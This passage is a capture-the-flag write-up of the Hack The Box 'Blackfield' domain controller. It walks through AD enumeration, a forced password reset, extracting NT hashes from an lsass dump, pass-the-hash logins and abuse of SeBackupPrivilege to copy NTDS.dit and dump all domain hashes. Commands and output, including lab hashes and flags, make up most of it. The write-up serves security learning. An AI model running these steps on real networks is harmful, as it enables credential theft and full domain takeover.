SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.                                                                                                     
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```
The user `support` could view the same shares as I could see anonymously.  Next I tried to see if this user could get any more information from them.

I connected to each of the three shares: profiles$ still had the same empty user directories, NETLOGON was completely empty. SYSVOL had a few files, but none of them contained anything useful.

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -h 10.10.10.192 -s sub -L -b "dc=BLACKFIELD,dc=LOCAL" > blackfield.LDAP
```

I ran ldapsearch next to see if I could get any more information than before, and a mountain of data returned.  (I also made the mistake of not sending the output to a file the first time and my screen exploded). Unfortunately, there was nothing new or useful in all of that the output (besides a slew of anonymous sounding usernames such as blackfield123456, etc.)

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 10S
```

With so many users to go off and no way to directly tell what rights I had with the user `support` I loaded bloodhound up to see if it could sniff me a path forward.  The python version of bloodhound allows it to be run against a remote host with credentials, and outputs a few `.json` files that I imported into the main program.

![](picture)

Bloodhound reported 314 (!)  users on this domain.  Most of them were named generically `BLACKFIELD123456`, however there were a few that stuck out. I set these as my targets and began looking for ways to link them.

Since I already had the credentials for `support` I marked that user as 'owned' and proceeded to see what I could do with its access.

Picture

Since `support` has the `ForceChangePassword` privilege over the user `audit2020`

I looked up how to change a user's password via SMB and found:
https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/

Unfortunately this did not work, so I did some searching to see if there was another way to do it remotely. I found a shady looking site that explained what I was looking for using RPC at https://malicious.link/post/2017/reset-ad-user-password-with-linux/ (it was mixed in the middle of a bunch of those scam/malware .it sites so I was a bit leary at first.)

This site showed that using rpcclient with the sysntax `rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'` you could change a user's password without knowing the current one.  It linked to a MSDN site which explained why to use `23` for the property. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN

3 pictures
```
The SAMPR_USER_INTERNAL4_INFORMATION structure holds all attributes of a user, along with an encrypted password.

 typedef struct _SAMPR_USER_INTERNAL4_INFORMATION {
   SAMPR_USER_ALL_INFORMATION I1;
   SAMPR_ENCRYPTED_USER_PASSWORD UserPassword;
 } SAMPR_USER_INTERNAL4_INFORMATION,
  *PSAMPR_USER_INTERNAL4_INFORMATION;
```

```
┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
└─$ rpcclient -U BLACKFIELD/support 10.10.10.192
Enter BLACKFIELD\support's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
...snipped...
user:[BLACKFIELD438814] rid:[0x584]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]

rpcclient $> chgpasswd audit2020
Usage: chgpasswd username oldpass newpass
rpcclient $> getdompwinfo 
min_password_length: 7
password_properties: 0x00000001
        DOMAIN_PASSWORD_COMPLEX
rpcclient $> setuserinfo audit2020 23 TestPass!23
```
I also tried doing it the 'easy' way with the one-liner at the bottom of the blog post and successfully changed it with the `net` command.  I'll definitely have to remember that I can use `net` commands from Linux in the future!

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ net rpc password audit2020 -U support -S 10.10.10.192  
Enter new password for audit2020:
Enter WORKGROUP\support's password:
```
now that I had a usable password for another user I set out to see what I could get into.  I was unable to use WinRM or get anything further from rpcclient, so I went back to enumerating the open SMB shares.

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ smbclient -W BLACKFIELD -U "audit2020"  \\\\10.10.10.192\\forensic 'TestPass!23'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3994160 blocks available
smb: \> cd commands_output\
smb: \commands_output\> mget *
Get file domain_admins.txt? y
getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)
Get file domain_groups.txt? y
getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (7.1 KiloBytes/sec) (average 4.6 KiloBytes/sec)
Get file domain_users.txt? y
getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (120.8 KiloBytes/sec) (average 38.8 KiloBytes/sec)
Get file firewall_rules.txt? y
getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (591.2 KiloBytes/sec) (average 400.3 KiloBytes/sec)
Get file ipconfig.txt? y
getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (12.8 KiloBytes/sec) (average 363.8 KiloBytes/sec)
Get file netstat.txt? y
getting file \commands_output\netstat.txt of size 3842 as netstat.txt (25.5 KiloBytes/sec) (average 332.5 KiloBytes/sec)
Get file route.txt? y
getting file \commands_output\route.txt of size 3976 as route.txt (23.4 KiloBytes/sec) (average 303.3 KiloBytes/sec)
Get file systeminfo.txt? y
getting file \commands_output\systeminfo.txt of size 4550 as systeminfo.txt (32.4 KiloBytes/sec) (average 283.7 KiloBytes/sec)
Get file tasklist.txt? y
getting file \commands_output\tasklist.txt of size 9990 as tasklist.txt (49.8 KiloBytes/sec) (average 261.8 KiloBytes/sec)
smb: \commands_output\> cd ../
smb: \> cd memory_analysis\
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                7846143 blocks of size 4096. 3994160 blocks available
smb: \memory_analysis\> get lsass.zip 
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (3436.8 KiloBytes/sec) (average 2963.0 KiloBytes/sec)
smb: \memory_analysis\> cd ..
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3994160 blocks available
smb: \> cd tools\
smb: \tools\> ls
  .                                   D        0  Sun Feb 23 08:39:08 2020
  ..                                  D        0  Sun Feb 23 08:39:08 2020
  sleuthkit-4.8.0-win32               D        0  Sun Feb 23 08:39:03 2020
  sysinternals                        D        0  Sun Feb 23 08:35:25 2020
  volatility                          D        0  Sun Feb 23 08:35:39 2020

                7846143 blocks of size 4096. 3994160 blocks available
```

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ pypykatz lsa minidump lsass.DMP                                                  
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == SSP [633ba]==
                username 
                domainname 
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
...smipped...

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == SSP [25869]==
                username 
                domainname 
                password None
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
```

ran mimikatz - python edition (`pypykatz`) on the  lssas.DMP file, then pulled out the usernames, passwords, and hashes

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ cat blackfieldCreds | grep -i username | cut -d '"' -f4 |sort | uniq >> usernames 
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ cat blackfieldCreds | grep -i password | cut -d '"' -f4 |sort | uniq >> passwords
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ vim passwords 
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ cat blackfieldCreds | grep -i nthash | cut -d '"' -f4 |sort | uniq >> hashes
```

I tried cracking the NTLM hashes with `hashcat` but even using all of the various rules and some basic mangles I was unsiccessful.  Luckily since this is Windows domain I can try to do a pass-the-hash attack instead.

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u targets -H hashes -o cme.status   
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator 9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_backup 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d
```

It didn't take long to find a valid combination.  The password (hash) for `svc_backup` was `9658d1d1dcd9250115e2205d9f48400d`. Luckily for me, this user is in the Windows Remote Management group, and port 5985 for WinRM was open.  I tried using evil-winRM and was logged in with a shell.



### Further enumeration

### Finding user creds

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
Imediately after logging in I knew I had a privilege escalation path.  Either of `SeBackupPrivilege` or `SeRestorePrivilege` can be abused for privilege escalation, but its even easier having both!



### User.txt

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/3/2020   2:56 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
5836c825f835143c68398b9e61f56fcf
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `svc_backup`

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b C:\Users\Administrator\Desktop\ ./

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, October 5, 2020 1:25:49 AM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\svc_backup\Documents\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           3    C:\Users\Administrator\Desktop\
        *EXTRA Dir        -1    C:\Users\svc_backup\Documents\My Music\
        *EXTRA Dir        -1    C:\Users\svc_backup\Documents\My Pictures\
        *EXTRA Dir        -1    C:\Users\svc_backup\Documents\My Videos\
            Newer                    282        desktop.ini
  0%
100%
            New File                 447        notes.txt
  0%
100%
            New File                  32        root.txt
2020/10/05 01:25:49 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
Access is denied.
```
So much for the easy way to get the flag.  with the SeBackupPrivilege I should have the ability to backup any file, but it lookds like there was something limiting it.  I did get a file `notes.txt`

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```
So the "audit report" (root.txt) is encrypted.  That would explain why it cannot be copied directly.  I guess I have to privesc first.  Searching for `SeBackupPrivilege` led me to https://github.com/giuliano108/SeBackupPrivilege. 

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilege
SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll    
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Users\svc_backup\Documents\SeBackupPrivilegeCmdLets.dll                                                                                                    

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:\Users\svc_backup\Documents\SeBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!
```

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ sudo smbserver.py share . -smb2support -username test -password test   

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```
created a samba share using impacket to copy over my loot
https://pentestlab.blog/tag/diskshadow/

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use z: \\10.10.15.132\share /USER:test test
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -quiet -include:C:\Windows\NTDS\NTDS.dit -backuptarget:z:\
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

The backup cannot be completed because the backup storage destination is a shared folder mapped to a drive letter. Use the Universal Naming Convention (UNC) path (\\servername\sharename\) of the backup storage destination instead.
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -quiet -include:C:\Windows\NTDS\NTDS.dit -backuptarget:\\10.10.15.132\\share
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.15.132\\share.

A backup cannot be done to a remote shared folder which is not hosted on a volume formatted with NTFS/ReFS.
```
Unfortunately it wont' back up to a drive that is not formatted with NTFS, and wont backup to the same drive letter.  

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -quiet -include:C:\Windows\NTDS\NTDS.dit -backuptarget:\\dc01\c$\users\svc_backup\
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\dc01\c$\users\svc_backup\.
The backup operation to \\dc01\c$\users\svc_backup\ is starting.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Windows Server Backup is updating the existing backup to remove files that have
been deleted from your server since the last backup.
This might take a few minutes.
The backup of volume (C:) completed successfully.
Summary of the backup operation:
------------------

The backup operation successfully completed.
The backup of volume (C:) completed successfully.
Log of files successfully backed up:
C:\Windows\Logs\WindowsServerBackup\Backup-05-10-2020_09-19-43.log
```
It took a bit of research and troubleshooting, but I found a workaround, in the form of using the network path for the local drive instead of the drive letter.  Now I just had to restore my backup to a location I controlled and exfiltrate the file.  I would also have to exfil the SYSTEM hive as well.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin get versions
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 9/21/2020 4:00 PM
Backup location: Network Share labeled \\10.10.14.4\blackfieldA
Version identifier: 09/21/2020-23:00
Can recover: Volume(s), File(s)

Backup time: 10/5/2020 2:19 AM
Backup location: Network Share labeled \\dc01\c$\users\svc_backup\
Version identifier: 10/05/2020-09:19
Can recover: Volume(s), File(s)
```
First I had to get the version identifier of the backup. It seemed like there was already a backup that had been made to `10.10.14.4\blackfieldA\` on 9/21/2020.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start recovery -quiet -version:10/05/2020-09:19 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\Users\svc_backup\Documents -notrestoreacl
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) c:\windows\ntds\ntds.dit from the
backup created on 10/5/2020 2:19 AM to C:\Users\svc_backup\Documents.
Preparing to recover files...

Successfully recovered c:\windows\ntds\ntds.dit to C:\Users\svc_backup\Documents\.
The recovery operation completed.
Summary of the recovery operation:
--------------------

Recovery of c:\windows\ntds\ntds.dit to C:\Users\svc_backup\Documents\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:\Windows\Logs\WindowsServerBackup\FileRestore-05-10-2020_09-27-38.log
```

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download NTDS.dit
Info: Downloading C:\Users\svc_backup\Documents\NTDS.dit to NTDS.dit

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM ./
^C

Warning: Press "y" to exit, press any other key to continue

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM ./system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SAM ./sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SECURITY ./security.hive
reg.exe : ERROR: Access is denied.
    + CategoryInfo          : NotSpecified: (ERROR: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

*Evil-WinRM* PS C:\Users\svc_backup\Documents> download system.hive
Info: Downloading C:\Users\svc_backup\Documents\system.hive to system.hive

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\svc_backup\Documents> download sam.hive
Info: Downloading C:\Users\svc_backup\Documents\sam.hive to sam.hive

                                                             
Info: Download successful!
```
Next I saved each of the registry hives and downloaded all of the files.  Unfortunately the SECURITY hive would not save, but I didn't really need it for getting the password hashes

### Getting a shell

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ secretsdump.py -system system.hive -sam sam.hive -ntds NTDS.dit LOCAL | tee blackfield.hashes

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
  
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from NTDS.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:30ccd2d5d879d9de6c5a39a5b8cc6165:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
...snipped...
```
Using Impacket's secretsdump.py I was able to dump the password hashes for all of the domain users (including the 300+ Blackfield123456 users!)


```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee                1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name                SID
======================== =============================================
blackfield\administrator S-1-5-21-4194615774-2175524697-3563712290-500


GROUP INFORMATION
-----------------

Group Name                                        Type             SID                                           Attributes
================================================= ================ ============================================= ===============================================================
Everyone                                          Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                            Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                     Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access        Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                              Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                  Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                    Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
BLACKFIELD\Domain Admins                          Group            S-1-5-21-4194615774-2175524697-3563712290-512 Mandatory group, Enabled by default, Enabled group
BLACKFIELD\Group Policy Creator Owners            Group            S-1-5-21-4194615774-2175524697-3563712290-520 Mandatory group, Enabled by default, Enabled group
BLACKFIELD\Schema Admins                          Group            S-1-5-21-4194615774-2175524697-3563712290-518 Mandatory group, Enabled by default, Enabled group
BLACKFIELD\Enterprise Admins                      Group            S-1-5-21-4194615774-2175524697-3563712290-519 Mandatory group, Enabled by default, Enabled group
BLACKFIELD\Denied RODC Password Replication Group Alias            S-1-5-21-4194615774-2175524697-3563712290-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                  Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level              Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/23/2020   5:03 AM                forensic
-a----        9/18/2020   3:39 PM            179 watcher.ps1

Evil-WinRM* PS C:\Users\Administrator\Documents> download watcher.ps1
Info: Downloading C:\Users\Administrator\Documents\watcher.ps1 to watcher.ps1
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c1cbe908dad337d81c58845ccd092e83
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

### Root.txt

After collecting the flag, I went to verify the reason that I was unable to back up `root.txt`.  

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cipher.exe /C

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

U notes.txt
E root.txt
  Compatibility Level:
    Windows Vista/Server 2008

